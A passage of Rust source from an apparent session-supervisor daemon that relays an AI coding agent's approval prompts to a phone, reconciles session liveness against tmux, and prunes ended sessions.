        /// passing load spike is retried without operator ceremony.
        const FAILURE_TTL: std::time::Duration = std::time::Duration::from_secs(30);

        {
            let inner = self.inner.lock().await;
            if let Some(cached) = inner.command_catalogs.get(fingerprint).cloned() {
                return CommandCatalogResult::Available {
                    commands: cached.commands,
                    claude_version: cached.claude_version,
                    probed_at: cached.probed_at,
                };
            }
            if let Some((reason, at)) = inner.catalog_failures.get(fingerprint) {
                if at.elapsed() < FAILURE_TTL {
                    return CommandCatalogResult::Unavailable {
                        reason: reason.clone(),
                    };
                }
            }
        }

        // Config-owned budget, clamped: a typo'd 3ms would turn every probe
        // into a phantom failure, and ten minutes would hang a palette.
        let deadline =
            std::time::Duration::from_millis(self.config.catalog_probe_ms.clamp(500, 30_000));
        match crate::catalog::probe_with(bin_path, std::path::Path::new(cwd), deadline).await {
            Ok(catalog) => {
                let result = CommandCatalogResult::Available {
                    commands: catalog.commands.clone(),
                    claude_version: catalog.claude_version.clone(),
                    probed_at: catalog.probed_at.clone(),
                };
                let mut inner = self.inner.lock().await;
                inner.catalog_failures.remove(fingerprint);
                inner
                    .command_catalogs
                    .insert(fingerprint.to_string(), catalog);
                result
            }
            Err(err) => {
                let reason = format!("{err:#}");
                let mut inner = self.inner.lock().await;
                inner.catalog_failures.insert(
                    fingerprint.to_string(),
                    (reason.clone(), std::time::Instant::now()),
                );
                CommandCatalogResult::Unavailable { reason }
            }
        }
    }

    /// A snapshot for a human to read: scrollback included.
    async fn capture_run(&self, session_uid: &str, lines: u32) -> Result<String> {
        self.capture_pane(session_uid, lines, false).await
    }

    /// A snapshot for the daemon to *decide* from: the visible pane and nothing
    /// else.
    ///
    /// Every presence and identity check goes through here. A prompt that has
    /// scrolled out of view is history, and history must never authorise a
    /// keystroke: the answer to a question a human answered ten minutes ago
    /// would otherwise be typed into whatever is on screen now.
    async fn capture_visible(&self, session_uid: &str) -> Result<String> {
        self.capture_pane(session_uid, 0, true).await
    }

    async fn capture_pane(
        &self,
        session_uid: &str,
        lines: u32,
        visible_only: bool,
    ) -> Result<String> {
        match self
            .supervisor_request(
                session_uid,
                SupervisorRequest::Capture {
                    lines,
                    visible_only,
                },
            )
            .await?
        {
            SupervisorResult::Snapshot { text } => Ok(text),
            other => Err(anyhow!("unexpected supervisor result: {other:?}")),
        }
    }

    // ----------------------------------------------------------- supervisors

    /// Register (or re-register) a session's supervisor.
    ///
    /// Returns the run's key so the connection can be tied to a *uid*: the
    /// socket is what tells us the supervisor went away, and unregistering by
    /// name would detach whichever run currently holds it.
    pub async fn register_supervisor(
        &self,
        info: RegisterSession,
        tx: mpsc::Sender<DaemonFrame>,
        inflight: Arc<std::sync::Mutex<HashMap<String, oneshot::Sender<SupervisorResult>>>>,
    ) -> Result<Registration> {
        let now = protocol::time::now_rfc3339();
        let existing = self
            .lookup_run(&info.session_id, info.session_uid.as_deref())
            .await?;
        let uid = match (&existing, &info.session_uid) {
            (Some(row), _) => row.session_uid.clone(),
            (None, Some(uid)) if protocol::uid::is_well_formed(uid) => uid.clone(),
            (None, _) => {
                let uid = protocol::uid::new()?;
                crate::log_info!(
                    "supervisor for {} registered without a uid; adopting it as {uid}",
                    info.session_id
                );
                uid
            }
        };

        let wrote = self
            .db
            .upsert_session(SessionRow {
                session_uid: uid.clone(),
                session_id: info.session_id.clone(),
                tmux_session: info.tmux_session.clone(),
                tmux_socket: info.tmux_socket.clone(),
                cwd: info.cwd.clone(),
                claude_session_id: None,
                transcript_path: None,
                lifecycle: Lifecycle::Live,
                created_at: existing
                    .as_ref()
                    .map(|r| r.created_at.clone())
                    .unwrap_or_else(|| info.started_at.clone()),
                updated_at: now,
            })
            .await?;
        // **The supervisor is a cwd writer too.** A run that reconnects from a
        // different directory moves, and any card it is holding has to move
        // with it — see `relabel_open_cards`.
        self.relabel_open_cards(&uid, &info.cwd).await;
        if wrote == crate::store::SessionUpsert::Tombstoned {
            // The uid was deleted while this registration was in flight.
            // Installing the in-memory supervisor anyway would leave the daemon
            // holding live state for a session with no row — a ghost that
            // resolves approvals into nothing. Refuse the registration; the
            // supervisor's next report fails and it exits on its own account.
            anyhow::bail!(
                "session {uid} was deleted; refusing the registration that raced the deletion"
            );
        }

        let session = SessionKey::new(uid, info.session_id.clone());
        let epoch = {
            let mut inner = self.inner.lock().await;
            inner.next_epoch += 1;
            let epoch = inner.next_epoch;
            inner.supervisors.insert(
                session.uid.clone(),
                SupervisorHandle {
                    tx,
                    inflight,
                    next_id: Arc::new(std::sync::atomic::AtomicU64::new(1)),
                    epoch,
                    protocol_minor: info.protocol_minor,
                    claude_bin: info.claude_bin.clone(),
                },
            );
            inner
                .last_seen_ms
                .insert(session.uid.clone(), protocol::time::now_unix_ms());
            epoch
        };

        // Re-attach after a daemon restart is a fact worth logging, not a
        // session boundary: the agent never stopped running.
        let pending = PendingEvent::new(
            &session,
            EventKind::LinkState,
            serde_json::json!({"link": "attached", "reason": "supervisor registered"}),
            Source::Daemon,
        );
        self.ingest(pending).await?;
        crate::log_info!(
            "supervisor registered for {} ({}) speaking minor {}",
            session.name,
            session.uid,
            info.protocol_minor
        );
        // Said once, at the moment it becomes true, rather than at the moment
        // somebody taps and gets a refusal they cannot explain.
        if info.protocol_minor < SUPERVISOR_MINOR_PROMPT_IDENTITY {
            crate::log_warn!(
                "the supervisor for {} predates prompt identity (minor {} < {}); approvals for \
                 this session can be viewed remotely but must be answered at the Mac until it is \
                 restarted",
                session.name,
                info.protocol_minor,
                SUPERVISOR_MINOR_PROMPT_IDENTITY
            );
        }
        Ok(Registration { session, epoch })
    }

    /// Release a supervisor slot when its connection ends.
    ///
    /// Only if it is still *this* registration's slot. A supervisor that
    /// reconnects registers again under the same uid, and the losing connection's
    /// teardown can run afterwards — removing blindly would detach the
    /// supervisor that had just replaced it, leaving a live session with no way
    /// to be typed into and a `detached` link that never recovers.
    pub async fn unregister_supervisor(&self, registration: &Registration) {
        let released = {
            let mut inner = self.inner.lock().await;
            match inner.supervisors.get(&registration.session.uid) {
                Some(handle) if handle.epoch == registration.epoch => {
                    inner.supervisors.remove(&registration.session.uid);
                    true
                }
                _ => false,
            }
        };
        if !released {
            crate::log_debug!(
                "ignoring a stale disconnect for {}: a newer supervisor holds it",
                registration.session.name
            );
            return;
        }
        let pending = PendingEvent::new(
            &registration.session,
            EventKind::LinkState,
            serde_json::json!({"link": "detached", "reason": "supervisor disconnected"}),
            Source::Daemon,
        );
        if let Err(err) = self.ingest(pending).await {
            crate::log_error!("failed to record detach: {err:#}");
        }
    }

    pub async fn heartbeat(&self, session_id: &str, session_uid: Option<&str>) {
        let Ok(Some(row)) = self.lookup_run(session_id, session_uid).await else {
            return;
        };
        self.inner
            .lock()
            .await
            .last_seen_ms
            .insert(row.session_uid, protocol::time::now_unix_ms());
    }

    pub async fn session_exited(
        &self,
        session_id: &str,
        session_uid: Option<&str>,
        exit_code: Option<i32>,
    ) {
        // Reported over a *fresh* connection by a supervisor whose session is
        // already gone, so the run has to be found again rather than inferred
        // from a socket that no longer exists.
        //
        // A supervisor at the current minor replays its registration on that
        // same connection first (see `cc`'s `report_exit`), which is what makes
        // a session that started *and* ended while the daemon was down land here
        // with a row to attach the exit to. Reaching the miss branch therefore
        // means either an older supervisor or a failed replay, and the two
        // outcomes below are kept apart because "we looked and it is not there"
        // and "we could not look" are different facts.
        let row = match self.lookup_run(session_id, session_uid).await {
            Ok(Some(row)) => row,
            Ok(None) => {
                crate::log_warn!(
                    "exit reported for {session_id}, which this daemon has no record of; \
                     it started and ended while ccd was not running and its supervisor did \
                     not replay a registration"
                );
                return;
            }
            Err(err) => {
                crate::log_error!(
                    "exit reported for {session_id} but the session could not be looked up \
                     ({err:#}); the run's final state is unknown"
                );
                return;
            }
        };
        self.mark_exited(&row.key(), exit_code, None).await;
    }

    /// Record that a run has ended: the durable lifecycle change, then the fact.
    ///
    /// The single place either half happens, because there are now two ways an
    /// end is *established* — a supervisor reporting its own exit, and the
    /// liveness sweep proving the tmux session is gone — and exactly one way it
    /// is recorded. A second copy of this would be a second chance for one path
    /// to update the row without emitting the event, which is the shape of the
    /// original defect seen from the other side: the phone would learn about the
    /// end by the row mutating underneath it rather than through the log.
    ///
    /// `reason` is `Some` only when the end was *derived* rather than reported.
    /// It rides alongside the existing `exit_code` rather than replacing
    /// anything, so a client that has never heard of it renders exactly what it
    /// rendered before; what it buys is that the log never implies somebody
    /// watched an exit that was in fact inferred from an absent tmux session.
    ///
    /// The `source_event_id` makes this idempotent per run. A run ends once, and
    /// the two paths can genuinely race — the sweep can prove a session gone in
    /// the same second its supervisor reconnects to say so. Without the id that
    /// race produces two `SessionEnd` events for one death; with it the second
    /// is deduplicated by the log's own rule and the first account stands.
    async fn mark_exited(
        &self,
        session: &SessionKey,
        exit_code: Option<i32>,
        reason: Option<&str>,
    ) {
        if let Err(err) = self
            .db
            .set_lifecycle(session.uid.clone(), Lifecycle::Exited)
            .await
        {
            crate::log_error!("failed to mark {} exited: {err:#}", session.name);
        }
        let payload = match reason {
            Some(reason) => serde_json::json!({"exit_code": exit_code, "reason": reason}),
            None => serde_json::json!({"exit_code": exit_code}),
        };
        let pending = PendingEvent::new(session, EventKind::SessionEnd, payload, Source::Daemon)
            .with_source_event_id(format!("exit:{}", session.uid));
        if let Err(err) = self.ingest(pending).await {
            crate::log_error!("failed to record exit: {err:#}");
        }
        // Sent *after* the event, so the order on the wire is the order things
        // happened: everything the tailer has already read is in the log ahead
        // of the end, and its own final read lands after it. A run that has
        // ended writes nothing more, and a tail nobody stops is a `stat` per
        // poll — plus a filesystem watch on a working directory that is usually
        // deleted — for the rest of the daemon's life.
        let _ = self.transcript_tx.send(crate::tailer::TailCommand::Stop {
            session_uid: session.uid.clone(),
        });
    }

    /// Ask the supervisor for something, and be precise about failure.
    ///
    /// The two failure kinds are not a nicety. A request that never left this
    /// process cannot have typed anything; one that was sent and never answered
    /// might have. Only the first may be retried, and a caller handed a single
    /// opaque error has no way to tell which it is holding.
    async fn supervisor_request(
        &self,
        session_uid: &str,
        mut request: SupervisorRequest,
    ) -> std::result::Result<SupervisorResult, SupervisorFailure> {
        // What the request needs the supervisor to be able to do, checked
        // against the handle that will actually receive it. Asked separately
        // beforehand it was a different question: a session can restart
        // between the two lookups, and the answer would be about a
        // supervisor that no longer exists.
        let needs_recovery = matches!(
            &request,
            SupervisorRequest::SendText {
                recover_composer: true,
                ..
            }
        );
        let (slot, tx, rx) = {
            let inner = self.inner.lock().await;
            let Some(handle) = inner.supervisors.get(session_uid) else {
                return Err(SupervisorFailure::NotSent(format!(
                    "no supervisor attached for {session_uid}"
                )));
            };
            if needs_recovery && handle.protocol_minor < SUPERVISOR_MINOR_COMPOSER_RECOVERY {
                return Err(SupervisorFailure::NotSent(
                    "this session cannot recover slash-command views safely yet. Restart it \
                     after updating CodeConnect, or use Terminal."
                        .into(),
                ));
            }
            // Completing a view is decided against **this** handle for the same
            // reason: a supervisor that predates the field drops it silently and
            // presses `Escape`, so a capability read from an earlier lookup
            // could hand a confirmation to a build that cannot make one. Asking
            // here withdraws it instead, and the ordinary rescue runs — the same
            // outcome as never having asked.
            if handle.protocol_minor < SUPERVISOR_MINOR_CONFIRM_VIEW {
                if let SupervisorRequest::SendText { confirm_view, .. } = &mut request {
                    *confirm_view = None;
                }
            }
            let id = handle
                .next_id
                .fetch_add(1, std::sync::atomic::Ordering::Relaxed)
                .to_string();
            let (response_tx, response_rx) = oneshot::channel();
            handle
                .inflight
                .lock()
                .unwrap_or_else(|p| p.into_inner())
                .insert(id.clone(), response_tx);
            // From here on the entry is owned by a guard, so every exit path
            // below — refused send, timeout, dropped channel, or a panic —
            // removes it. It used to be removed only by a *reply*, which meant
            // every timed-out request left a `oneshot::Sender` in the map
            // forever: one entry per abandoned capture, on a supervisor that
            // lives as long as its session, growing without any bound and with
            // nothing that would ever collect it.
            let slot = InflightSlot {
                id,
                inflight: Arc::clone(&handle.inflight),
            };
            (slot, handle.tx.clone(), response_rx)
        };

        // `try_send` rather than an await: the queue is bounded now, and
        // blocking the answer path on a supervisor that has stopped reading is
        // exactly the stall this is meant to avoid. Both refusals — full and
        // closed — mean the frame never left this process, which is precisely
        // what `NotSent` promises its caller.
        if let Err(err) = tx.try_send(DaemonFrame::SupervisorRequest {
            id: slot.id.clone(),
            request,
        }) {
            return Err(SupervisorFailure::NotSent(match err {
                mpsc::error::TrySendError::Full(_) => {
                    format!("the supervisor for {session_uid} is not reading its requests")
                }
                mpsc::error::TrySendError::Closed(_) => {
                    format!("supervisor for {session_uid} is gone")
                }
            }));
        }

        match tokio::time::timeout(Duration::from_millis(self.config.supervisor_timeout_ms), rx)
            .await
        {
            Ok(Ok(result)) => Ok(result),
            // Both of these are "it was sent and we never heard back". The
            // supervisor may have acted before it stopped answering.
            Ok(Err(_)) => Err(SupervisorFailure::Unanswered(
                "the supervisor dropped the request".into(),
            )),
            Err(_) => Err(SupervisorFailure::Unanswered(
                "the supervisor did not answer in time".into(),
            )),
        }
    }

    // -------------------------------------------------------------- queries

    pub async fn sessions(&self) -> Result<Vec<SessionSummary>> {
        let rows = self.db.list_sessions().await?;
        let inner = self.inner.lock().await;
        let now = protocol::time::now_unix_ms();
        let mut out = Vec::with_capacity(rows.len());
        for row in rows {
            let attached = inner.supervisors.contains_key(&row.session_uid);
            let last_seen = inner.last_seen_ms.get(&row.session_uid).copied();
            // Positive liveness only: silence is `stale`, never `idle`.
            let link = match (attached, last_seen) {
                (false, _) => Link::Detached,
                (true, Some(ms)) if now - ms > self.config.stale_after_ms as i64 => Link::Stale,
                (true, Some(_)) => Link::Attached,
                (true, None) => Link::Degraded,
            };
            let blocked_on = inner
                .pending
                .values()
                .filter(|p| p.session.uid == row.session_uid)
                .map(|p| p.card.request_id.clone())
                .collect();
            out.push(SessionSummary {
                session_uid: row.session_uid.clone(),
                session_id: row.session_id.clone(),
                tmux_session: row.tmux_session,
                // Resolved here rather than on the phone, because a push has
                // to be named by something the phone cannot compute — it may
                // not be running — and two rules for one name produce two
                // names. Lexical, so it costs nothing on a read this hot. See
                // `project_label`.
                project_label: crate::project_label::project_label(&row.cwd),
                cwd: row.cwd,
                lifecycle: row.lifecycle,
                link,
                claude_session_id: row.claude_session_id,
                transcript_path: row.transcript_path,
                last_seq: self.db.max_seq(row.session_uid.clone()).await?,
                created_at: row.created_at,
                updated_at: row.updated_at,
                blocked_on,
            });
        }
        Ok(out)
    }

    // ---------------------------------------------------- liveness sweep

    /// Reconcile every session's `lifecycle` against tmux, and act on proof only.
    ///
    /// **The defect this exists to close.** Until this ran, `Lifecycle::Exited`
    /// had exactly one writer: a supervisor telling the daemon its own session
    /// had ended. That covers the case where everything is working and nothing
    /// else. If `ccd` was down when the agent died, if the supervisor was killed
    /// (`pkill cc`, a crashed terminal, a `kill -9` storm), or if the Mac slept
    /// through the exit, nobody ever said so — and the row stayed `live`
    /// *permanently*, because nothing else looked. Measured on the owner's
    /// machine: 26 of 45 sessions reported as running, on a Mac with no tmux
    /// server at all. The periodic sweeper that already existed reconciled
    /// approvals and never liveness, so the fleet's central claim — this agent
    /// is running — was the one thing nothing ever checked.
    ///
    /// **What counts as proof.** Only tmux's own words, through
    /// [`protocol::tmux`], which is the same classifier the supervisor reads.
    /// Three answers and three different actions:
    ///
    ///   * **Present** — left alone. It is running.
    ///   * **Gone**, confirmed [`protocol::tmux::EXIT_CONFIRMATIONS`] times —
    ///     marked `Exited`, with the same `SessionEnd` a reported exit produces,
    ///     so the phone learns through the log rather than by a row changing
    ///     under it.
    ///   * **Unknown** — left alone, and *not* counted toward anything. tmux
    ///     missing, a socket we cannot address, a message we do not recognise, a
    ///     child that timed out: none of those is evidence of an exit, and
    ///     marking a live session dead is the same class of lie as the bug this
    ///     fixes, told in the opposite direction. `unknown` is a state the
    ///     product supports precisely so this can decline to guess.
    ///
    /// **Why it is bounded.** One question per distinct `(socket, name)` rather
    /// than one per row — presence is a property of the tmux server, so six dead
    /// runs that reused the name `cc-1` are one question — and the questions are
    /// asked one after another, so a fleet of hundreds costs one child at a time
    /// rather than hundreds at once. Every step is an `await`, and the database
    /// work goes through [`crate::db`] onto the blocking pool, so no part of
    /// this occupies a runtime worker. Two sweeps never overlap.
    ///
    /// **What it deliberately does not do.** A name reused by a session that is
    /// currently running answers `Present`, and every row claiming that name is
    /// left alone — including the dead ones. That is the honest answer: tmux
    /// knows there is a session called `cc-1`, not whose it is. Those rows are
    /// what `codeconnect sessions prune` and the fleet's `session_uid` are for.
    pub async fn reconcile_liveness(&self) -> LivenessSweep {
        let prober = crate::liveness::Prober::new(LIVENESS_PROBE_TIMEOUT);
        if !prober.is_available() {
            // Said once, rather than once per session: with no tmux there is
            // nothing to ask, every answer would be `Unknown`, and the fleet is
            // left exactly as it was.
            crate::log_warn!(
                "liveness: tmux is not installed at a known location, so no session's state can \
                 be established; the fleet is left as it is"
            );
            return LivenessSweep::default();
        }
        self.reconcile_liveness_with(&prober, LIVENESS_RECHECK_DELAY)
            .await
    }

    /// The sweep, against any source of proof.
    ///
    /// Split from [`Daemon::reconcile_liveness`] so the *policy* — which rows
    /// are candidates, how many confirmations an exit takes, what is left alone
    /// — is exercised without a tmux server. A test that needed one could only
    /// fail on a machine where tmux happened to misbehave, and the behaviour
    /// that matters here is what the daemon does with an answer, not how it
    /// obtains one.
    async fn reconcile_liveness_with<P: crate::liveness::Presence>(
        &self,
        prober: &P,
        recheck_delay: Duration,
    ) -> LivenessSweep {
        // A sweep already running holds this. Skipping is the right
        // backpressure: the next tick will do the same work, and queueing would
        // let a slow machine accumulate sweeps that all reach the same answer.
        let Ok(_running) = self.liveness_sweep.try_lock() else {
            crate::log_debug!("liveness: a sweep is already running; skipping this one");
            return LivenessSweep::default();
        };
        let started = std::time::Instant::now();

        let rows = match self.db.list_sessions().await {
            Ok(rows) => rows,
            Err(err) => {
                // An unreadable session list is not an empty fleet, and must
                // never be treated as one.
                crate::log_error!(
                    "liveness: could not read the session list ({err:#}); no session's state was \
                     reconciled"
                );
                return LivenessSweep::default();
            }
        };

        // Everything that has not already reached a terminal state. `Unknown` is
        // included deliberately: it means an earlier attempt could not tell, and
        // this is the attempt that might.
        let mut by_target: std::collections::BTreeMap<crate::liveness::Target, Vec<SessionKey>> =
            std::collections::BTreeMap::new();
        let mut sweep = LivenessSweep::default();
        for row in rows {
            if row.lifecycle == Lifecycle::Exited {
                continue;
            }
            // A run with no recorded location was adopted, not spawned: the
            // hooks arrived but nothing here put it in tmux, so tmux cannot
            // testify about it — probing a fabricated name is how live adopted
            // runs used to be "proven" dead and deleted. Skipped before the
            // counters so `examined`/`unknown` and the per-sweep warn line stay
            // truthful rather than naming these rows forever.
            if row.tmux_socket.is_empty() {
                continue;
            }
            sweep.examined += 1;
            by_target
                .entry(crate::liveness::Target {
                    socket: row.tmux_socket.clone(),
                    name: row.tmux_session.clone(),
                })
                .or_default()
                .push(row.key());
        }
        sweep.targets = by_target.len();
        if by_target.is_empty() {
            return sweep;
        }

        // First look. Sequential on purpose: each is a subprocess round-trip of
        // a few milliseconds, and one child at a time is a bound that needs no
        // semaphore to be true.
        //
        // **One probe per distinct name, but a verdict per row.** Presence is still
        // a property of the server, so six rows that recorded `cc-1` remain one
        // question and the sweep stays proportional to names rather than to rows.
        // What changed is the reading: the answer now carries *whose* `cc-1` it is,
        // so the same single answer says `Present` to the run that holds the name
        // and `Gone` to the ones that used to.
        let mut suspect: Vec<(crate::liveness::Target, SessionKey, Option<String>)> = Vec::new();
        for (target, sessions) in &by_target {
            let sighting = prober.presence(target).await;
            for session in sessions {
                match sighting.verdict(&session.uid) {
                    protocol::tmux::SessionPresence::Present => sweep.present += 1,
                    protocol::tmux::SessionPresence::Gone => {
                        suspect.push((target.clone(), session.clone(), holder(&sighting)))
                    }
                    protocol::tmux::SessionPresence::Unknown(why) => {
                        sweep.unknown += 1;
                        crate::log_debug!("liveness: {target} could not be established: {why}");
                    }
                }
            }
        }

        // The confirmations. A reported exit is durable and cannot be withdrawn,
        // so one look is not enough — a server restarting between the sweep and
        // the answer, or a probe that raced a server's startup, produces exactly
        // one `Gone` for a session that is running.
        //
        // Confirmed **per row**, not per name. Two rows sharing a name no longer
        // share a fate: the one that holds it answers `Present` on every look while
        // the other answers `Gone` on every look, and a per-name confirmation could
        // only ever have given both the same verdict.
        for _ in 1..protocol::tmux::EXIT_CONFIRMATIONS {
            if suspect.is_empty() {
                break;
            }
            tokio::time::sleep(recheck_delay).await;
            // Still one child per distinct name in this round, however many rows
            // are suspected under it.
            let mut looks: std::collections::BTreeMap<
                crate::liveness::Target,
                crate::liveness::Sighting,
            > = std::collections::BTreeMap::new();
            for (target, _, _) in &suspect {
                if !looks.contains_key(target) {
                    looks.insert(target.clone(), prober.presence(target).await);
                }
            }
            let mut confirmed = Vec::with_capacity(suspect.len());
            for (target, session, _) in suspect {
                let sighting = looks.get(&target);
                match sighting.map(|s| s.verdict(&session.uid)) {
                    Some(protocol::tmux::SessionPresence::Gone) => {
                        let held = sighting.and_then(holder);
                        confirmed.push((target, session, held))
                    }
                    // It came back, it changed hands back to this run, or we lost
                    // the ability to look. Any of those makes the first
                    // observation no longer evidence of anything.
                    other => {
                        sweep.unconfirmed += 1;
                        crate::log_debug!(
                            "liveness: {target} looked gone for {} and then answered {other:?}; \
                             leaving it alone",
                            session.uid
                        );
                    }
                }
            }
            suspect = confirmed;
        }

        {
            for (target, session, held) in &suspect {
                let session = &session.clone();
                // Two different facts, and the log must not report the second as
                // the first. A name nobody holds and a name held by a *newer run*
                // both mean this run is gone, but only one of them means there is
                // no such tmux session — and saying so when `cc-1` is plainly on
                // screen is exactly the kind of claim this daemon does not make.
                match held {
                    Some(other) => crate::log_info!(
                        "liveness: {} ({}) is marked exited — tmux session {} on {} is held by \
                         {}, so this run is no longer the one running under that name",
                        session.name,
                        session.uid,
                        target.name,
                        target.socket,
                        other
                    ),
                    None => crate::log_info!(
                        "liveness: {} ({}) is marked exited — tmux says session {} is not on {}",
                        session.name,
                        session.uid,
                        target.name,
                        target.socket
                    ),
                }
                self.mark_exited(
                    session,
                    // Nobody watched this run end, so there is no exit status to
                    // report. Saying `null` is the honest answer; inventing a 0
                    // would claim it finished cleanly.
                    None,
                    Some(&format!(
                        "no tmux session {:?} on server {:?}; the daemon never saw this run end \
                         and established it had by asking tmux",
                        target.name, target.socket
                    )),
                )
                .await;
                sweep.gone += 1;
            }
        }

        sweep.elapsed = started.elapsed();
        sweep
    }

    /// The per-device floor between deliberate test pushes: `None` when this
    /// device may send now (and the send is recorded), or the seconds left.
    pub async fn test_push_gate(&self, device_id: &str) -> Option<u32> {
        const FLOOR: std::time::Duration = std::time::Duration::from_secs(30);
        let mut inner = self.inner.lock().await;
        let now = std::time::Instant::now();
        if let Some(last) = inner.test_pushes.get(device_id) {
            let elapsed = now.duration_since(*last);
            if elapsed < FLOOR {
                // Ceiling, not floor: "try again in 1s" must never be sayable
                // while 1.9s actually remain — a wait the answer understates is
                // a refusal the user cannot act on.
                return Some((FLOOR - elapsed).as_secs_f64().ceil() as u32);
            }
        }
        inner.test_pushes.insert(device_id.to_string(), now);
        None
    }

    /// Remove one ended run, for the phone's swipe.
    ///
    /// The lifecycle rule lives in the SQL, so this cannot weaken it by
    /// forgetting a check. The other two guards it *must* carry itself, because
    /// they are facts no query can see: a run with a supervisor attached right
    /// now, and a run with an approval still open. Those are the same two
    /// [`Self::prune_ended_sessions`] refuses on, and skipping them here would
    /// have made a swipe the one route past a protection the bulk path calls
    /// non-negotiable.
    ///
    /// Not theoretical. `mark_exited` records the end and stops the tail; it does
    /// not retire `inner.pending`, so an approval outlives the run it belongs to
    /// until something resolves or expires it. Delete the rows underneath one and
    /// its later resolution writes events for a session that no longer exists —
    /// the schema has no foreign key to stop it.
    ///
    /// A refusal reads as `StillRunning` on the wire. That is the honest word for
    /// it: whatever the lifecycle column says, this daemon is still holding live
    /// state for that run.
    pub async fn delete_exited_session(
        &self,
        session_uid: &str,
    ) -> Result<protocol::ws::DeleteSessionResult> {
        {
            let inner = self.inner.lock().await;
            if inner.supervisors.contains_key(session_uid)
                || inner.pending.keys().any(|(uid, _)| uid == session_uid)
            {
                crate::log_info!(
                    "refused to delete {session_uid}: still holding live state for it"
                );
                return Ok(protocol::ws::DeleteSessionResult::StillRunning);
            }
        }
        let uid = session_uid.to_string();
        let outcome = self.db.delete_exited_session(uid).await?;
        Ok(match outcome {
            crate::store::DeleteOutcome::Deleted { events } => {
                crate::log_info!("deleted session {session_uid} and {events} event(s) on request");
                // Nothing left to ring about, and stale latches must not leak
                // onto a future run.
                self.push_gate.evict_session(session_uid);
                // A live unhosted run may still have a transcript tail; its
                // cursor died with the rows, so an unstopped tail would re-read
                // the file from byte zero every poll, forever, into a guard
                // that drops every batch. Harmless no-op for hosted rows, whose
                // tails stopped at `mark_exited`.
                let _ = self.transcript_tx.send(crate::tailer::TailCommand::Stop {
                    session_uid: session_uid.to_string(),
                });
                protocol::ws::DeleteSessionResult::Deleted { events }
            }
            // The store's word for it, carried through rather than flattened.
            // `Live` and `Spawning` mean the agent is there; `Unknown` means the
            // daemon never found out, and those are not the same refusal.
            crate::store::DeleteOutcome::NotExited { lifecycle }
                if lifecycle == crate::store::lifecycle_str(Lifecycle::Unknown) =>
            {
                protocol::ws::DeleteSessionResult::NotExited { lifecycle }
            }
            crate::store::DeleteOutcome::NotExited { .. } => {
                protocol::ws::DeleteSessionResult::StillRunning
            }
            crate::store::DeleteOutcome::NotFound => protocol::ws::DeleteSessionResult::NotFound,
        })
    }

    /// Remove ended runs from the log, at an operator's explicit request.
    ///
    /// The counterpart to reconciliation rather than an afterthought to it. A
    /// real machine accumulates ended sessions exactly the way the owner's did
    /// — 45 rows, most of them from soak runs and long-dead experiments — and
    /// without a supported way to clear them the only options are living with
    /// the clutter or deleting `events.db`, which throws away the history of
    /// the sessions that *are* running along with it.
    ///
    /// Never automatic, and never on a timer. The event log is the source of
    /// truth, and a daemon that pruned it on its own judgement would be
    /// deciding which of somebody's agent history was worth keeping.
    ///
    /// **What it refuses to touch.** Anything not `Exited` — the store enforces
    /// that — plus two things only this process knows: a run with a supervisor
    /// attached right now, and a run with an approval still open. Either would
    /// mean the daemon holds live state for a session it had just erased the
    /// record of. Both should be impossible for a row marked `Exited`, which is
    /// exactly why they are checked: if one ever happens, it is a bug, and
    /// deleting the evidence of it is the worst possible response.
    pub async fn prune_ended_sessions(&self, dry_run: bool) -> Result<Vec<PrunedSession>> {
        let protect: Vec<String> = {
            let inner = self.inner.lock().await;
            inner
                .supervisors
                .keys()
                .cloned()
                .chain(inner.pending.keys().map(|(uid, _)| uid.clone()))
                .collect::<std::collections::BTreeSet<_>>()
                .into_iter()
                .collect()
        };
        let removed = self.db.prune_exited_sessions(protect, dry_run).await?;
        if !dry_run {
            for row in &removed {
                self.push_gate.evict_session(&row.session_uid);
            }
        }
        if !removed.is_empty() && !dry_run {
            crate::log_info!(
                "prune: removed {} ended session(s) and {} event(s) at the operator's request",
                removed.len(),
                removed.iter().map(|row| row.events).sum::<u64>()
            );
        }
        Ok(removed)
    }

    /// Expire approvals nobody answered, so `blocked_on` reflects reality.
    pub async fn expire_stale_approvals(&self, max_age_ms: i64) {
        let now = protocol::time::now_unix_ms();
        let expired: Vec<(String, SessionKey)> = {
            let inner = self.inner.lock().await;
            inner
                .pending
                .iter()
                .filter(|(_, p)| !p.claimed && now - p.created_ms > max_age_ms)
                .map(|((_, request_id), p)| (request_id.clone(), p.session.clone()))
                .collect()
        };
        for (request_id, session) in expired {
            self.resolve_without_phone(
                &request_id,
                &session,
                AnswerDecision::Deny,
                ResolvedBy::Timeout,
                "expired without an answer; local operator owns it",
                // The daemon never observed an answer, and says so.
                true,
            )
            .await;
        }
    }

    // ------------------------------------------------- local resolution

    /// Notice approvals that were answered at the Mac's keyboard.
    ///
    /// Two signals, in decreasing order of confidence:
    ///
    /// 1. **A tool result arrived** for the request. The call ran, so it was
    ///    approved. That is an observation, and the decision it implies is a
    ///    fact rather than a guess.
    /// 2. **The prompt left the pane and the composer came back.** All this
    ///    proves is that the prompt was dismissed — not what was chosen — so the
    ///    recorded decision is marked `inferred` and the phone is expected to
    ///    render "answered at the keyboard" from `resolved_by`, not to present
    ///    the decision as fact.
    ///
    /// Getting this wrong in the *other* direction is the expensive mistake:
    /// resolving an approval the human has not answered would make the card
    /// vanish from the phone while the Mac still waits. Everything defensive
    /// here exists for that one failure — the grace period, the two consecutive
    /// observations, requiring the composer's return rather than accepting the
    /// prompt's absence, and treating an unreadable pane as no evidence at all.
    pub async fn sweep_local_resolutions(&self) {
        if !self.config.local_resolve {
            return;
        }
        let now = protocol::time::now_unix_ms();
        let grace = self.config.local_resolve_grace_ms as i64;

        // Snapshot first: capturing a pane is a subprocess round-trip and must
        // not happen with the state lock held.
        let candidates: Vec<(String, SessionKey, bool, i64)> = {
            let inner = self.inner.lock().await;
            inner
                .pending
                .iter()
                .filter(|(_, p)| !p.claimed)
                .map(|((_, request_id), p)| {
                    (
                        request_id.clone(),
                        p.session.clone(),
                        p.tool_ran,
                        p.created_ms,
                    )
                })
                .collect()
        };
        if candidates.is_empty() {
            return;
        }

        // The tool ran: resolve immediately, no pane reading required.
        for (request_id, session, _, _) in candidates.iter().filter(|(_, _, ran, _)| *ran) {
            self.resolve_without_phone(
                request_id,
                session,
                AnswerDecision::Allow,
                ResolvedBy::Local,
                "the tool ran, so it was approved at the keyboard",
                false,
            )
            .await;
        }

        // One capture per run, however many approvals are outstanding on it.
        let mut sessions: Vec<SessionKey> = candidates
            .iter()
            .filter(|(_, _, tool_ran, created)| !tool_ran && now - created > grace)
            .map(|(_, session, _, _)| session.clone())
            .collect();
